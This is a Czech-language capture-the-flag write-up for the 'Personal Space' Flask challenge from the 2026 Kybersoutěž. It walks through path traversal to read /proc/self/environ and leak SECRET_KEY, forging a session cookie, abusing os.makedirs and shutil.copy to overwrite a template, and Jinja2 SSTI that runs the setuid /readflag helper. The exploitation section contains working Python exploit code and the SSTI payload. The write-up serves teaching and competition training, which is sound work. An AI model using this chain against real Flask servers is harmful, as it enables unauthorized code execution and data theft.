<div align="center">

# 🗂️ Personal Space

[🇬🇧 English](README.md) · 🇨🇿 **Čeština**

</div>

## Kybersoutěž 2. kolo 2026

> **Kybersoutěž** je česká národní soutěž v kybernetické bezpečnosti určená studentům základních, středních i vysokých škol ve věku 9–24 let. Je pořádána ve formátu CTF a jejím cílem je rozvíjet digitální dovednosti, vyhledávat talenty a zvyšovat povědomí o kybernetických hrozbách mezi mladou generací v České republice.

### Přehled

Flask webová aplikace dovoluje každému návštěvníkovi ukládat krátké textové poznámky do vlastního „personal space" — adresáře na disku vázaného na session. Vlajka se nachází za `setuid root` pomocnou binárkou, ke které se aplikace dostane jen spuštěním kódu kontrolovaného útočníkem, takže cílem je plnohodnotné spuštění kódu na serveru.

**Řetězec útoku:**

1. Zneužít path traversal chybu k přečtení `/proc/self/environ` a získat `SECRET_KEY` Flasku
2. Pomocí uniklého klíče zfalšovat session cookie, která posune „personal space" aplikace mimo její sandbox
3. Zneužít chybu v kombinaci `shutil.copy` / `os.makedirs` k přepsání vlastní Jinja2 šablony aplikace payloadem pro Server-Side Template Injection
4. Spustit otrávenou šablonu, aby na serveru provedla privilegovanou pomocnou binárku `/readflag`

---

### Infrastruktura

Aplikace běží uvnitř kontejneru jako neprivilegovaný uživatel `nobody` a pro přečtení vlajky komunikuje se samostatným privilegovaným pomocným binárním souborem:

```dockerfile
FROM python:3.13 AS readflag
RUN apt update && apt install gcc -y
COPY readflag.c .
RUN gcc -s readflag.c -o /readflag

FROM python:3.13
COPY --from=readflag /readflag /readflag
COPY flag.txt /flag.txt
RUN chmod 4755 /readflag && chmod 400 flag.txt

RUN pip install flask
RUN mkdir /spaces && chown nobody:nogroup /spaces
COPY --chmod=755 entrypoint.sh /

USER nobody
COPY --chown=nobody:nogroup app /app
WORKDIR /app
ENTRYPOINT ["/entrypoint.sh"]
```

`/readflag` má nastavený `setuid root` (`chmod 4755`) a jednoduše přečte `/flag.txt`, který je jinak pro uživatele `nobody`, pod kterým aplikace běží, nečitelný (`chmod 400`):

```c
int main() {
    setuid(0);
    char flag[512] = {0};
    int fd = open("/flag.txt", O_RDONLY);
    read(fd, flag, sizeof(flag));
    close(fd);
    printf("%s", flag);
    return 0;
}
```

Cílem tedy není jen přečíst soubor — je potřeba donutit aplikaci, aby za útočníka spustila `/readflag`.

---

### Analýza zranitelnosti

#### Krok 1 — Path traversal odhalí tajný klíč Flasku

Prohlídka zdrojového kódu odhalí jádro logiky „personal space":

```python
PERSONAL_SPACES = "/spaces/"
WELCOME_MESSAGE = "Welcome.txt"

def get_personal_space() -> str:
    personal_space = PERSONAL_SPACES + session.setdefault("id", secrets.token_urlsafe())
    try:
        os.makedirs(personal_space)
    except FileExistsError:
        pass
    if not os.path.exists(f"{personal_space}/{WELCOME_MESSAGE}"):
        shutil.copy(WELCOME_MESSAGE, personal_space)
    return personal_space

def get_personal_item(item: str) -> str | None:
    with open(f"{get_personal_space()}/{item}") as f:
        return f.read()

@app.get("/get/<path:personal_item>")
def get(personal_item):
    return str(get_personal_item(personal_item))
```

`/get/<path:personal_item>` používá Flaskův `path` konvertor, který bez problémů přijme lomítka — včetně `../`. Nic `personal_item` nevaliduje předtím, než se spojí do cesty k souboru a otevře, což je přímočarý **path traversal**. Nejcennější cíl není rovnou souborový systém — je to `/proc/self/environ`, které si aplikace servíruje sama sobě:

```
GET /get/../../proc/self/environ
```

Aplikace si svůj podpisový klíč pro session nastavuje přímo z proměnné prostředí při startu:

```python
app.secret_key = os.environ["SECRET_KEY"]
```

Přečtení `/proc/self/environ` tenhle `SECRET_KEY` rovnou odhalí — a tajný klíč Flasku stačí k tomu, aby šlo offline zfalšovat libovolnou, platně podepsanou session cookie.

#### Krok 2 — Zfalšování session k útěku ze sandboxu

`get_personal_space()` staví svůj adresář čistě ze `session["id"]`, bez jakékoli validace — jen se stringově připojí k `/spaces/`:

```python
personal_space = PERSONAL_SPACES + session.setdefault("id", secrets.token_urlsafe())
```

Flaskové session jsou cookie na straně klienta, kryptograficky podepsané (ne šifrované) tajným klíčem aplikace. Se `SECRET_KEY` v ruce jde libovolný obsah session zfalšovat lokálně, pomocí vlastního podpisového serializeru Flasku:

```python
from flask.sessions import SecureCookieSessionInterface
from flask import Flask

class MockApp(Flask):
    def __init__(self, secret_key):
        super().__init__("mock")
        self.secret_key = secret_key

def forge_cookie(secret_key, session_data):
    app = MockApp(secret_key)
    serializer = SecureCookieSessionInterface().get_signing_serializer(app)
    return serializer.dumps(session_data)
```

Nastavením `session["id"] = "../app/"` se `personal_space` změní na `/spaces/../app/` — tedy `/app/`, vlastní zdrojový adresář aplikace. Sandbox „personal space" je pryč.

#### Krok 3 — Proměnit přepsání souboru v SSTI

Dvě drobné implementační chyby se spojí do primitiva pro přepsání libovolného souboru:

- `os.makedirs(personal_space)` je obalené holým `except FileExistsError: pass` — a `os.makedirs` vyhodí přesně tuhle výjimku bez ohledu na to, jestli existující cesta je adresář, nebo **obyčejný soubor**. Nasměrování `session["id"]` na plnou cestu existujícího souboru tedy nic nerozbije — výjimka se tiše spolkne.
- Hned poté se spustí `shutil.copy(WELCOME_MESSAGE, personal_space)`, kdykoli neexistuje `{personal_space}/{WELCOME_MESSAGE}`. Když je `personal_space` sám o sobě soubor (ne adresář), tahle podmínka je přirozeně nepravdivá — takže `shutil.copy` se spustí s `personal_space` jako **přímo cílovým souborem**, který přepíše obsahem `/app/Welcome.txt`.

To dává dvoukrokové primitivum: nejdřív ovládnout obsah `/app/Welcome.txt` přes běžnou funkci „put" aplikace, pak zfalšovat session mířící přímo na jakýkoli zapisovatelný cílový soubor, aby byl tiše nahrazen obsahem `Welcome.txt`. Nejužitečnější cíl je Jinja2 šablona, protože `render_template()` zkompiluje a provede cokoliv, co v ní je — tedy **Server-Side Template Injection**.

---

### Exploitace

**Přepsat `/app/Welcome.txt` SSTI payloadem**, přes vlastní endpoint aplikace `/put`, pomocí zfalšované session mířící na adresář aplikace:

```python
payload = "{{ config.__class__.__init__.__globals__['os'].popen('/readflag').read() }}"

session_data = {"id": "../app/"}
cookie = forge_cookie(SECRET_KEY, session_data)

requests.post(f"{TARGET_URL}/put",
              cookies={"session": cookie},
              data={"name": "Welcome", "data": payload})
```

`name=Welcome` se stane `Welcome.txt`, který přistane přímo na `/app/Welcome.txt`.

**Spustit trik se `shutil.copy` proti `/app/templates/put.html`**, čímž se skutečná šablona přepíše teď už otráveným `Welcome.txt`:

```python
session_data = {"id": "../app/templates/put.html"}
cookie = forge_cookie(SECRET_KEY, session_data)

requests.get(TARGET_URL, cookies={"session": cookie})
```

Jakýkoli požadavek, který zavolá `get_personal_space()` — stačí obyčejný `GET /` — spustí sekvenci `os.makedirs`/`shutil.copy` proti téhle zfalšované cestě a tiše přepíše `put.html` SSTI payloadem.

**Navštívit `/put` a nechat Flask vykreslit otrávenou šablonu:**

```python
resp = requests.get(f"{TARGET_URL}/put")
print(resp.text)
```

`render_template("put.html")` teď zkompiluje Jinja2 zdrojový kód kontrolovaný útočníkem. Payload projde od `config` přes hierarchii tříd Pythonu až k `os`, spustí privilegovaný pomocný program `/readflag` a vlajku vrátí přímo v HTTP odpovědi:

```
HCKR{1_esC4P3d_MY_P3r50N4l_sP4c3_T0_b3C0M3_0mn1p0t3nt}
```
</content>
